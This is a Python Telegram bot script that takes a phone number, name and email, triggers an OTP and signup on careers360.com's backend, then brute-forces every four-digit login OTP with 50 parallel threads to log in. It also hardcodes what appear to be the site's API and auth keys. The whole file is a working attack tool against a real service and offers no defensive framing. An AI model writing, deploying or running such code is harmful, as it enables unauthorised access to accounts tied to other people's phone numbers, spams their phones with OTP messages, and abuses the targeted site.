import requests
import concurrent.futures
import random
import time
import os
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Load environment variables (set in Koyeb)
TOKEN = os.getenv("BOT_TOKEN")  # Telegram Bot Token
HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
    "device-type": "mobile",
    "x-auth-key": "QeQohnkIqobSaDQITN02Ojpe3nC8dXn4hltbRt1t-TIb",
    "user-agent-key": "195696a6d915c14b",
    "Content-Type": "application/json"
}

# Flask app for deployment
app = Flask(__name__)

@app.route('/')
def home():
    return "Telegram Bot is Running!"

# AskMe links
ASK_ME_LINKS = [
    "ebooks/jee-main-preparation-tips-complete-strategy-study-plan",
    "ebooks/jee-main-highest-scoring-chapters-and-topics"
]

# Telegram Bot Functionality
async def op(update: Update, context: CallbackContext):
    await update.message.reply_text("Enter details in format: {number} - {Name} - {email}")

async def message_handler(update: Update, context: CallbackContext):
    user_input = update.message.text
    chat_id = update.message.chat_id

    try:
        mobile_number, user_name, user_email = map(str.strip, user_input.split("-"))
    except ValueError:
        await update.message.reply_text("❌ Invalid input format! Use {number} - {Name} - {email}")
        return

    ask_me = random.choice(ASK_ME_LINKS)

    # Send OTP
    otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
    otp_data = {
        "otp_on": "mobile",
        "cta_clicked": "signup",
        "otp_action": "send",
        "isd_code": "+91",
        "mobile_number": mobile_number
    }

    response = requests.post(otp_url, json=otp_data, headers=HEADERS)

    if response.status_code == 200 and response.json().get("result"):
        message = await update.message.reply_text("✅ OTP Sent - 👍")
    else:
        await update.message.reply_text("❌ OTP Sending Failed")
        return

    # Signup Request
    signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
    signup_data = {
        "current_url": f"https://engineering.careers360.com/download/{ask_me}",
        "destination": f"https://engineering.careers360.com/download/{ask_me}",
        "cta_clicked": "signup",
        "country_code": "+91",
        "mobile_number": mobile_number,
        "email": user_email,
        "name": user_name,
        "passing_year": 2025,
        "degree_interested": 2,
        "domain_id": 1
    }

    signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)

    if signup_response.status_code == 200 and signup_response.json().get("result"):
        user_uuid = signup_response.json()["data"].get("user_uuid")
        await message.edit_text("✅ Signup Successful - 👍")
    else:
        await message.edit_text("❌ Signup Failed")
        return

    # Brute-force OTPs
    login_url = "https://backend-cus.careers360.com/api/1/cus/login"
    found_otp = None
    checked_otps = 0

    def try_otp(otp):
        nonlocal found_otp, checked_otps
        if found_otp:
            return None

        login_data = {
            "current_url": f"https://engineering.careers360.com/download/{ask_me}",
            "destination": f"https://engineering.careers360.com/download/{ask_me}",
            "otp_on": "mobile",
            "country_code": "+91",
            "mobile_number": mobile_number,
            "otp": otp,
            "user_uuid": user_uuid
        }

        login_response = requests.post(login_url, json=login_data, headers=HEADERS)

        if login_response.status_code == 200 and login_response.json()["data"].get("otp_response"):
            found_otp = otp
            return otp

        checked_otps += 1
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        for otp in range(1000, 10000):
            if found_otp:
                break
            executor.submit(try_otp, otp)

    if found_otp:
        await message.edit_text(f"✅ Valid OTP Found: {found_otp} - 👍")
        await message.edit_text("✅ Login Successful - 👍")
    else:
        await message.edit_text("❌ Login Failed")

# Initialize Telegram Bot
async def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("op", op))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    await app.run_polling()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
